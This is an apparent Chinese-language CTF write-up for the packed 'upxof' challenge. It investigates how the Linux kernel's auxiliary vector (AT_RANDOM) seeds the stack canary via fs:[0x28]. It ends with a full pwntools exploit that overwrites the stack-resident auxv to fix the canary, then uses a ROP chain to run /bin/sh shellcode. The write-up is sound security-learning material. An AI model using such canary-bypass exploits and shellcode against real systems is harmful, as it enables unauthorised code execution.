---
title: 'auxv:origin_of_canaries'
date: 2019-02-25 22:18:14
tags:
---
origin_of_canaries

<!--more-->

# orgin
学弟发给我一题 upxof...
[binary][9]
我由于自己的两次sb操作导致在很简单的问题上搞了两个晚上....
通过这题...了解了canary的起源..
我发现没了gdb我啥都不是...壳还是极大地加大了我的调试难度...不知道对于这种题有没有debug的好方法...
# analysis
checksec
```sh
[*] '/home/n132/Desktop/upxof'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
    Packer:   Packed with UPX
```
看到checksec本以为挺简单的...我真是too young too naivi

* 丢进ida发现有一个输出password然后一个输入然后做了一大堆工作..mmap然后把代码复制上去,之后好像在解壳.
* 想用gdb跟遇到了不少麻烦...:
```sh
1.因为没有解壳所以无法直接下断点(调了半天的我目前的方法是边下断点边c之后在下断点再c...为了应对边运行边解壳)
2.不知为啥bt一看发现都没有ebp的记录...然后导致不能随心所欲的ni...有时候一个ni或者一个finish直接gg
3.不能finish,ni导致了在一些无关的函数，循环内耗费大量时间(函数:先直接b 函数下一地址，c看看效果没啥大影响就直接过..循环:先x/8i address找到出循环的地址A,然后b *A，c...出循环..)
4.善用gdb.attach(p,‘’‘’‘’)的第二个参数..把调试命令放进去...
例如我最终的调试命令
b *0x400a2e
c
b *0x400c93
c
b *0x800b4e
c
c
c
c
b *0x800d91
c
b *0x4005e9
c
si
si
si
si
si
si
si
b *0x7ffff7a99f40
c
c
b *0x7ffff7a9a08e
```
* strings的时候发现,尝试了解壳...发现用不太来...最后感觉不用解也可以做就没继续
```s
$Info: This file is packed with the UPX executable packer http://upx.sf.net $
$Id: UPX 3.91 Copyright (C) 1996-2013 the UPX Team. All Rights Reserved. $
```
* 整个程序是输入一次passwd(最长0x4096),一次let's go(用的gets),难点是第二次存在canary
* 学弟说是canary起源...搜了半天,发现了auxv
# auxv
从内核空间到用户空间的神秘信息载体...
* [auxv][1]
* [auxv][3]
简而言之 auxv中包含了cannary的地址
在链接之前就已经确定

# LLLLAb
随便编译了一个程序
叫canary
* gdb canary 
* aslr on
* start
```arm
   0x40062e <main+8>     mov    rax, qword ptr fs:[0x28]
   0x400637 <main+17>    mov    qword ptr [rbp - 8], rax
   0x40063b <main+21>    xor    eax, eax
   0x40063d <main+23>    mov    dword ptr [rbp - 0x34], 0
 ►
```
在`fs:[0x28]`·中获取了canary...以前一直不知道这个fs是什么...
* ps -aux |grep canary
获得proc的 pid
* cd /proc/{pid}/
* cp ./auxv ./home/n132/Desktop
之后用010edit打开
```bin
21 00 00 00 00 00 00 00 00 60 9C 3A FF 7F 00 00
10 00 00 00 00 00 00 00 FF FB 8B 0F 00 00 00 00
06 00 00 00 00 00 00 00 00 10 00 00 00 00 00 00
11 00 00 00 00 00 00 00 64 00 00 00 00 00 00 00
03 00 00 00 00 00 00 00 40 00 40 00 00 00 00 00
04 00 00 00 00 00 00 00 38 00 00 00 00 00 00 00
05 00 00 00 00 00 00 00 09 00 00 00 00 00 00 00
07 00 00 00 00 00 00 00 00 30 7C 83 F1 7F 00 00
08 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
09 00 00 00 00 00 00 00 30 05 40 00 00 00 00 00
0B 00 00 00 00 00 00 00 E8 03 00 00 00 00 00 00
0C 00 00 00 00 00 00 00 E8 03 00 00 00 00 00 00
0D 00 00 00 00 00 00 00 E8 03 00 00 00 00 00 00
0E 00 00 00 00 00 00 00 E8 03 00 00 00 00 00 00
17 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
19 00 00 00 00 00 00 00 89 08 8C 3A FF 7F 00 00
1F 00 00 00 00 00 00 00 DE 2F 8C 3A FF 7F 00 00
0F 00 00 00 00 00 00 00 99 08 8C 3A FF 7F 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
``` 
对照[glibc/elf/elf.h][4]内的宏定义我们可以理解auxv了

```bin
AT_SYSINFO_EHDR: 0x7fff3a9c6000
AT_HWCAP:        f8bfbff
AT_PAGESZ:       0x1000
AT_CLKTCK:       100
AT_PHDR:         0x400040
AT_PHENT:        56
AT_PHNUM:        9
AT_BASE:         0x7ff1837c3000
AT_FLAGS:        0x0
AT_ENTRY:        0x400530
AT_UID:          1000
AT_EUID:         1000
AT_GID:          1000
AT_EGID:         1000
AT_SECURE:       0
AT_RANDOM:       0x7fff3a8c0889
AT_EXECFN:       0x7fff3a8c2fde
AT_PLATFORM:     0x7fff3a8c0899
```
进入gdb
```sh
n132>>> x/s 0x7fff3a8c2fde
0x7fff3a8c2fde:	"/home/n132/Desk"...
n132>>> x/s 0x7fff3a8c0899
0x7fff3a8c0899:	"x86_64"
n132>>> x/8gx 0x7fff3a8c0889
0x7fff3a8c0889:	0xb85039cc2a5b826f
n132>>> canary
canary : 0xb85039cc2a5b8200
```
可以发现auxv的内的变量正如文章内所说是
`Mysterious carriers of information from kernelspace to userspace.`
实现内核到用户空间的信息交流.从而实现了canary

文章中还提及在程序一开始AT_RANDOM,AT_EXECFN,AT_PLATFORM和其他的值会被push到栈上

```sh
stack 1000
...
1096| 0x7fff3a8c0848 --> 0x7fff3a8c0889 --> 0xb85039cc2a5b826f 
1104| 0x7fff3a8c0850 --> 0x1f 
1112| 0x7fff3a8c0858 --> 0x7fff3a8c2fde ("/home/n132/Desk"...)
1120| 0x7fff3a8c0860 --> 0xf 
1128| 0x7fff3a8c0868 --> 0x7fff3a8c0899 --> 0x34365f363878 ('x86_64')
...
```
...一个大胆的想法诞生了...我试着改写栈上的值
首先先看一下内存中存在AT_RANDOM的地方...
```python
n132>>> searchmem 0x7fff3a8c0889
Searching for '0x7fff3a8c0889' in: None ranges
Found 1 results, display max 1 items:
[stack] : 0x7fff3a8c0848 --> 0x7fff3a8c0889 --> 0xb85039cc2a5b826f 
n132>>> x/8gx 0x7ff1839cd728
0x7ff1839cd728:	0xb85039cc2a5b8200	0x23cdf44b7dcc94de
...
n132>>> x/8gx 0x7fff3a8c0889
0x7fff3a8c0889:	0xb85039cc2a5b826f	0x23cdf44b7dcc94de
0x7fff3a8c0899:	0x000034365f363878	...
```
存在canary的地方
```python
n132>>> searchmem 0xb85039cc2a5b8200
Searching for '0xb85039cc2a5b8200' in: None ranges
Found 2 results, display max 2 items:
 mapped : 0x7ff1839cd728 --> 0xb85039cc2a5b8200 
[stack] : 此处是main开始时push上去的所以不算
```
因为是从fs:[0x28]上取得canary...然后地址0x7ff1839cd728也是0x28结尾
于是我多做了几次实验发现都是0x28结尾所以
`fs-->0x7ff1839cd728`
也就是得到了canary的起源
```python
       来源于                            来源于           来源于
Canany------>0x7ff1839cd728(fs:[0x28])-------->AT_RANDOM------>Kernel
```
所以讲道理 我们只要改写` mapped : 0x7ff1839cd728 --> 0xb85039cc2a5b8200`
就可以破坏canary.或者我们在load前改写掉AT_RANDOM就可以控制 canary


于是关于这题邪恶的想法在我脑中产生.


## 思路

* 乘着没有load时 overflow 掉在栈上关于的结构体设置canary为已知的值
* 接着程序会解壳这时候就可以溢出做rop 跳到我们的shellcode.

## exp
```python

from pwn import *
rdi=0x0000000000800766
p=process("./upxof")
p.readuntil("password:")
"""
gdb.attach(p,'''
b *0x400a2e
c
b *0x400c93
c
b *0x800b4e
c
c
c
c
b *0x800d91
c
b *0x4005e9
c
si
si
si
si
si
si
si
b *0x7ffff7a99f40
c
c
b *0x7ffff7a9a08e
''')
"""
#context.log_level='debug'
s=p64(0)*14+p64(0x1)+p64(0x600100)+p64(0)
s+=p64(0x600100)*23+p64(0)
s+=p64(0x21)+p64(0x600100)+p64(0x10)+p64(0x78bfbff)+p64(6)+p64(0x1000)+p64(0x11)+p64(0x64)+p64(3)+p64(0x400040)
s+=p64(0x4)+p64(0x38)+p64(0x5)+p64(2)+p64(7)+p64(0)+p64(8)+p64(0)+p64(9)+p64(0x400988)
s+=p64(0xb)+p64(0x3e8)+p64(0xc)+p64(0x3e8)+p64(0xd)+p64(0x3e8)+p64(0xe)+p64(0x3e8)+p64(0x17)
s+=p64(0)+p64(0x19)
s+=p64(0x600100)+p64(0x1f)+p64(0x600100)+p64(0xf)+p64(0x600100)
p.sendline("12345678"+s)
addr=0x00602000-0x200
p.sendlineafter("let's go:","\x00"*0x408+p64(0)+p64(addr+0x80-0x8)+p64(rdi)+p64(addr)+p64(0x400763)+p64(0x400763)+p64(0x400763))
context.arch='amd64'
sleep(1)
shellcode="\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
shellcode=shellcode.ljust(0x80,'\x00')+p64(addr)
p.sendline(shellcode)
p.interactive()


```

# review.
调试是个好东西....没了调试犯的傻逼错误都找不出来...
不知道这个程序是咋弄出来的.

[1]: https://lwn.net/Articles/519085/
[3]: http://articles.manugarg.com/aboutelfauxiliaryvectors.html
[4]: https://code.woboq.org/userspace/glibc/elf/elf.h.html
[9]: https://github.com/n132/Watermalon/blob/master/0CTF_2017/upxof/upxof